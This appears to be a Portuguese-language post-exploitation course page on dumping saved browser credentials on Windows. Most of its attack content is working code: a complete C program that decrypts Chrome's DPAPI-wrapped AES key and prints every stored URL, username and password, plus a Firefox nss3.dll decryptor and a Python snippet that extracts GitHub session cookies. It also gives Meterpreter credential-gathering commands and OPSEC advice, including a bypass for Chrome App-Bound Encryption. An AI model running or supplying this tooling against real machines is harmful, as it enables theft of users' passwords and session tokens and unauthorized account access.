---
layout: cyber
section: pos-expl-windows
title: "Browser Credentials — Firefox + Chrome"
---

# 09. Browser Credentials — Firefox + Chrome

## Centenas de Credenciais num Único Arquivo

Usuários salvam centenas de credenciais no browser — GitHub, VPNs, Jira, cloud consoles. Dump de credenciais de browser equivale a acesso lateral massivo sem precisar de mais exploits. Alvos comuns incluem desenvolvedores com tokens AWS/GCP salvos em extensão de browser, credenciais de GitLab/Bitbucket, e acesso a portais VPN web.

---

## Chrome / Chromium (Edge, Brave, Opera)

### Arquitetura de Armazenamento

Chrome usa SQLite + DPAPI:
- **Login Data**: `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` (SQLite).
- **Cookies**: `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies` (SQLite, Chrome 96+).
- **Local State**: `%LOCALAPPDATA%\Google\Chrome\User Data\Local State` (JSON — contém encrypted AES key).

Desde Chrome 80: passwords criptografadas com AES-256-GCM. Key derivada de DPAPI e armazenada em `Local State` como `encrypted_key` (base64). AES key só usável pelo usuário logado (DPAPI is user-bound).

### Pipeline de Extração

1. Ler `Local State` → extrair `encrypted_key` (base64).
2. Base64-decode → remover prefixo `DPAPI` (5 bytes: `\x44\x50\x41\x50\x49`).
3. `CryptUnprotectData(blob)` → obter AES master key.
4. Abrir `Login Data` (copiar arquivo primeiro — Chrome faz lock).
5. Query: `SELECT origin_url, username_value, password_value FROM logins`.
6. Para cada `password_value`: AES-256-GCM decrypt com master key + nonce (12 bytes, prefixo `v10`).

### Código

```c
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#pragma comment(lib, "crypt32")

// Dependência: sqlite3.h + sqlite3.c (amalgamation)
#include "sqlite3.h"

// Helper: CryptUnprotectData para obter AES key
BOOL DecryptDpapi(PBYTE pIn, DWORD cbIn, PBYTE* ppOut, DWORD* pcbOut) {
    DATA_BLOB inp = { cbIn, pIn };
    DATA_BLOB out = { 0 };
    if (!CryptUnprotectData(&inp, NULL, NULL, NULL, NULL, 0, &out)) return FALSE;
    *ppOut  = out.pbData;
    *pcbOut = out.cbData;
    return TRUE;
}

// AES-256-GCM decrypt via BCrypt
BOOL AesGcmDecrypt(PBYTE pKey, PBYTE pNonce, PBYTE pCipher, DWORD cbCipher,
                   PBYTE pTag, PBYTE pOut, DWORD* pcbOut) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pKey, 32, 0);

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce     = pNonce;
    authInfo.cbNonce     = 12;
    authInfo.pbTag       = pTag;
    authInfo.cbTag       = 16;

    status = BCryptDecrypt(hKey, pCipher, cbCipher, &authInfo,
                           NULL, 0, pOut, cbCipher, (PULONG)pcbOut, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return NT_SUCCESS(status);
}

void DumpChromePasswords() {
    // 1. Ler Local State para extrair AES key
    char szLocalState[MAX_PATH];
    ExpandEnvironmentStringsA("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State",
                               szLocalState, MAX_PATH);

    FILE* f = fopen(szLocalState, "rb");
    if (!f) { printf("[!] Local State not found\n"); return; }
    fseek(f, 0, SEEK_END); long sz = ftell(f); rewind(f);
    char* pJson = (char*)malloc(sz + 1);
    fread(pJson, 1, sz, f);
    fclose(f);
    pJson[sz] = '\0';

    // Parse: "encrypted_key":"<b64>"
    char* pKey = strstr(pJson, "\"encrypted_key\":\"");
    if (!pKey) { free(pJson); return; }
    pKey += strlen("\"encrypted_key\":\"");
    char* pEnd = strchr(pKey, '"');
    *pEnd = '\0';

    // Base64 decode
    DWORD cbB64 = (DWORD)(pEnd - pKey);
    DWORD cbRaw = 0;
    CryptStringToBinaryA(pKey, cbB64, CRYPT_STRING_BASE64, NULL, &cbRaw, NULL, NULL);
    PBYTE pRaw = (PBYTE)malloc(cbRaw);
    CryptStringToBinaryA(pKey, cbB64, CRYPT_STRING_BASE64, pRaw, &cbRaw, NULL, NULL);
    free(pJson);

    // Remover prefixo DPAPI (5 bytes: "DPAPI")
    PBYTE pAesKey = NULL; DWORD cbAesKey = 0;
    DecryptDpapi(pRaw + 5, cbRaw - 5, &pAesKey, &cbAesKey);
    free(pRaw);

    if (!pAesKey) { printf("[!] DPAPI decrypt failed\n"); return; }

    // 2. Copiar Login Data (evitar lock)
    char szSrc[MAX_PATH], szDst[] = "C:\\Temp\\ld_tmp.db";
    ExpandEnvironmentStringsA("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data",
                               szSrc, MAX_PATH);
    CopyFileA(szSrc, szDst, FALSE);

    // 3. Abrir SQLite
    sqlite3* db; int rc;
    if ((rc = sqlite3_open(szDst, &db)) != SQLITE_OK) {
        printf("[!] SQLite: %s\n", sqlite3_errmsg(db)); return;
    }

    const char* sql = "SELECT origin_url, username_value, password_value FROM logins;";
    sqlite3_stmt* stmt;
    sqlite3_prepare_v2(db, sql, -1, &stmt, NULL);

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        const char*  url      = (const char*)sqlite3_column_text(stmt, 0);
        const char*  username = (const char*)sqlite3_column_text(stmt, 1);
        const PBYTE  pBlob    = (PBYTE)sqlite3_column_blob(stmt, 2);
        int          cbBlob   = sqlite3_column_bytes(stmt, 2);

        if (cbBlob < 15 || memcmp(pBlob, "v10", 3) != 0) {
            printf("[PLAIN] %s :: %s\n", url, username);
            continue;
        }

        // v10 format: "v10" + nonce(12) + ciphertext + tag(16)
        PBYTE pNonce  = pBlob + 3;
        PBYTE pCipher = pBlob + 3 + 12;
        int   cbCipher = cbBlob - 3 - 12 - 16;
        PBYTE pTag    = pBlob + cbBlob - 16;

        PBYTE pPlain = (PBYTE)malloc(cbCipher + 1);
        DWORD cbPlain = 0;
        if (AesGcmDecrypt(pAesKey, pNonce, pCipher, cbCipher, pTag, pPlain, &cbPlain)) {
            pPlain[cbPlain] = '\0';
            printf("[+] %s :: %s :: %s\n", url, username, pPlain);
        }
        free(pPlain);
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileA(szDst);
    LocalFree(pAesKey);
}
```

### Cookies Chrome

Mesmo pipeline. Arquivo: `Network\Cookies`. Query:
```sql
SELECT host_key, name, encrypted_value FROM cookies;
```

Cada `encrypted_value` = mesmo formato `v10` + AES-GCM.

---

## Firefox

Firefox usa NSS (Network Security Services) + Master Password opcional.

### Arquitetura de Armazenamento

- **Credenciais**: `%APPDATA%\Mozilla\Firefox\Profiles\<profile>\logins.json` (JSON com campos `encryptedUsername`, `encryptedPassword`).
- **Key database**: `key4.db` (SQLite) — metadados de encriptação.
- **Encryption**: PKCS#8 + 3DES-CBC (sem Master Password) ou com Master Password derivado via PBKDF2.

### Abordagem 1: Via `nss3.dll` (Firefox instalado)

Firefox exporta funções em `nss3.dll`:
- `NSS_Init(profilePath)` — inicializa NSS.
- `PK11_GetInternalKeySlot()` — slot de criptografia.
- `PK11_CheckUserPassword(slot, masterPw)` — autenticar (senha vazia = sem Master Password).
- `PK11SDR_Decrypt(data, result)` — decriptar credencial.

```c
typedef SECStatus (*NSS_Init_t)(const char*);
typedef PK11SlotInfo* (*PK11_GetInternalKeySlot_t)(void);
typedef SECStatus (*PK11_CheckUserPassword_t)(PK11SlotInfo*, const char*);
typedef SECStatus (*PK11SDR_Decrypt_t)(SECItem*, SECItem*, void*);

void DumpFirefoxPasswords(const char* pProfile) {
    HMODULE hNss = LoadLibraryA("nss3.dll");
    NSS_Init_t                pNssInit = (NSS_Init_t)GetProcAddress(hNss, "NSS_Init");
    PK11_GetInternalKeySlot_t pGetSlot = (PK11_GetInternalKeySlot_t)GetProcAddress(hNss, "PK11_GetInternalKeySlot");
    PK11_CheckUserPassword_t  pCheckPw = (PK11_CheckUserPassword_t)GetProcAddress(hNss, "PK11_CheckUserPassword");
    PK11SDR_Decrypt_t         pDecrypt = (PK11SDR_Decrypt_t)GetProcAddress(hNss, "PK11SDR_Decrypt");

    pNssInit(pProfile);

    PK11SlotInfo* slot = pGetSlot();
    pCheckPw(slot, "");  // sem Master Password

    // Ler logins.json e para cada credencial:
    // base64_decode(encryptedUsername) → SECItem → PK11SDR_Decrypt → plaintext
    // [leitura de JSON omitida — usar cJSON ou parser simples]
}
```

### Abordagem 2: Sem Firefox Instalado — Key4.db Manual

Se `nss3.dll` não disponível, extrair de `key4.db` + `logins.json` manualmente:

1. `key4.db`: query `SELECT item1, item2 FROM metadata WHERE id='password';`.
2. `item1` = salt PBKDF2, `item2` = PKCS#7 encrypted check value.
3. Derivar key via PBKDF2-HMAC-SHA256 com senha vazia + salt.
4. Decrypt check value com 3DES-CBC.
5. Usar key para decriptar `a11/a102` em `key4.db` → master encryption key.
6. Com master key, decriptar `logins.json` entries.

Implementação completa disponível em **firepwd** (lclevy/firepwd, Python) — pode ser portada para C.

---

## Cookies de Sessão — Token Theft

Além de passwords, cookies de sessão autenticada:

```python
# Firefox cookies: places.sqlite (history/bookmarks), cookies.sqlite
# Chrome cookies: Network/Cookies
# Extrair e reutilizar cookie via curl/requests

import sqlite3, shutil
db = shutil.copy("Cookies", "/tmp/cookies_tmp")
conn = sqlite3.connect(db)
cur  = conn.execute("SELECT host_key,name,encrypted_value FROM cookies WHERE host_key LIKE '%github%'")
for row in cur:
    print(row[0], row[1], row[2][:20], "...")
```

Com cookie de sessão válido → acesso à aplicação web sem necessidade de username/password.

---

## Armazenamento de Outros Browsers

| Browser | Passwords path | Formato |
|---------|---------------|---------|
| Chrome | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` | SQLite + DPAPI/AES-GCM |
| Edge | `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data` | Idêntico ao Chrome |
| Brave | `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data` | Idêntico |
| Opera | `%APPDATA%\Opera Software\Opera Stable\Login Data` | Idêntico |
| Firefox | `%APPDATA%\Mozilla\Firefox\Profiles\*\logins.json` | NSS/PKCS#8 |

---

## Ferramentas Existentes

- **SharpChrome** (.NET) — Chrome passwords + cookies.
- **Get-ChromePasswords.ps1** — PowerShell.
- **firefox_decrypt** (lclevy/firepwd, Python).
- **SharpFox** (.NET) — Firefox via nss3.dll.
- **Mimikatz** `dpapi::chrome` — Chrome via DPAPI.

### Meterpreter

```bash
meterpreter> run post/multi/gather/firefox_creds
meterpreter> run post/windows/gather/credentials/credential_collector
```

---

## OPSEC

- **Login Data file lock**: Chrome mantém `Login Data` aberto. Copiar via `CopyFile` geralmente funciona; alternativamente usar VSS shadow copy (`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\...`).
- **DPAPI user-bound**: só funciona como usuário proprietário dos dados. Em SYSTEM: usar `CryptUnprotectData` com `CRYPTPROTECT_LOCAL_MACHINE` flag NÃO funciona — precisa impersonar token do usuário.
- **Processo filho do Chrome**: ao rodar como filho do Chrome, DPAPI key herdada → decrypt funciona sem `CryptUnprotectData` extra.
- **Chrome App-Bound Encryption (Chrome 127+)**: Google migrou para IPC com `elevation_service.exe` + App-Bound Encryption para dificultar credential theft. Bypass: `elevation_service.exe` COM object ainda acessível como SYSTEM ou via COM impersonation.

## Módulos Relacionados

`03_credenciais_windows.md` cobre DPAPI internals e dump de LSASS — o mesmo mecanismo de proteção que Chrome usa para proteger sua master key AES. `07_in_memory_capture.md` complementa com screenshots de browser para capturar dados visíveis que não estão em arquivo. ATT&CK T1555.003 (Credentials from Web Browsers) mapeia as técnicas desta nota.
